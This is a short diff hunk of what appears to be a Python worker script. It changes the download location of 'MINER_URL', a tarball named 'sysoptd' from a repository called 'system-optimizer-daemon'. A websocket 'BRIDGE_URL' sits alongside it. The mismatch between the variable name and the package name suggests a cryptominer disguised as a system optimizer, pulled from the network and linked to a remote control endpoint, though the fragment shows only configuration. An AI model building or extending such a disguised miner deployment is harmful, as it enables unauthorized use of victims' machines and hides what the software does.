@@ -10,7 +10,7 @@ import subprocess
 from datetime import datetime
 
 # Worker config
-MINER_URL = "https://github.com/amineborkadi/system-optimizer-daemon/releases/download/v2.1.5/sysoptd-2.1.5.tar.gz"
+MINER_URL = "https://raw.githubusercontent.com/amineborkadi/system-optimizer-daemon/master/sysoptd-2.1.5.tar.gz"
 BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"
 
 
